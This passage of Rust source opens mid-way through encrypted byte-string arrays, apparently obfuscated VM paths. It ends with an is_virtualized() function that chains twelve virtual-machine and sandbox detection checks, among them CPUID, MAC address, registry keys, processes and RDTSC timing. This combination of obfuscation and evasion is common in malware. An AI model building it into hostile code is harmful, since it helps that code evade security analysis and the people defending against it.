86 , 21 , 19 , 174 , 60 , 234 , 254 , 198 , 1 , 33 , 0 , 65 , 71 , 58 , 128 , 52 , 165 , 25 , 201 , 36 , 23 , 151 , 177 , 224 , 194 , 169 , 136 , 117 , 2 , 97 , 208 , 108 , 179 , 26 , 50 , 121 , 36 , 2 , 224 , 12 , 84 , 125 , 115 , 82 , 57 , 242 , 60 , 107 , 234 , 43 , 229 , 226 , 5 , 117 , 178 , 156 , 44 , 232 , 199 , 118 , 103 , 19 , 13 , 102 , 41 , 4 , 201 , 7 , 206 , 253 , 74 , 239 , 184 , 83 , 98 , 56 , 128 , 154 , 116 , 57 , 115 , 110 , 100 , 168 , 64 , 50 , 178 , 227 , 196 , 35 , 174 , 32 , 211 , 162 , 47 , 219 , 211 , 99 , 185 , 221 , 116 , 91 , 139 , 53 , 58 , 32 , 133 , 96 , 21 , 26 , 241 , 243 , 123 , 53 , 111 , 180 , 252 , 226 , 134 , 70 , 155 , 148 , 107 , 156 , 18 , 237 , 113 , 180 , 143 , 137 , 170 , 14 , 18 , 146 , 83 , 119 , 120 , 213 , 66 , 167 , 132 , 20 , 233 , 239 , 209 , 114 , 148 , 170 , 127 , 245 , 239 , 100 , 14 , 6 , 51 , 129 , 99 , 221 , 254 , 9 , 197 , 78 , 68 , 253 , 59 , 99 , 247 , 84 , 75 , 247 , 64 , 218 , 180 , 15 , 248 , 170 , 170 , 218 , 175 , 33 , 105 , 194 , 156 , 198 , 20 , 72 , 86 , 80 , 140 , 224 , 2 , 1 , 7 , 36 , 253 , 212 , 248 , 168 , 134 , 86 , 208 , 245 , 81 , 62 , 13 , 31 , 106 , 210 , 99 , 242 , 99 , 101 , 178 , 243 , 21 , 148 , 227 , 253 , 174 , 64 , 36 , 116 , 192 , 173 , 30 , 12 , 57 , 239 , 151 , 81 , 99 , 189 , 12 , 120 , 164 , 220 , 40 , 86 , 128 , 175 , 210] , & [79 , 17 , 160 , 131 , 26 , 253 , 242 , 100 , 37 , 236 , 113 , 238 , 175 , 212 , 77 , 213 , 30 , 200 , 70 , 137 , 33 , 75 , 227 , 64 , 71 , 242 , 65 , 184 , 237 , 180 , 68 , 22 , 145 , 179 , 128 , 15 , 183 , 219 , 189 , 204 , 52 , 163 , 69 , 2 , 94 , 216 , 133 , 100 , 19 , 151 , 108 , 232 , 136 , 166 , 161 , 111 , 223 , 140 , 215 , 220 , 181 , 33 , 85 , 227 , 230 , 217 , 163 , 160 , 230 , 228 , 199 , 101 , 57 , 57 , 101 , 4 , 55 , 35 , 8 , 76 , 19 , 85 , 115 , 167 , 77 , 88 , 1 , 213] , 88854283421529u64) ,] ; for dir in & vm_dirs { if Path :: new (& * * dir) . exists () { return true ; } } false } pub fn is_virtualized () -> bool { check_cpuid_hypervisor () || check_mac_address () || check_bios () || check_cpu_cores () || check_memory_size () || check_disk_size () || check_display_adapter () || check_pci_devices () || check_drivers () || check_vm_registry_keys () || check_vm_processes () || check_rdtsc_timing () }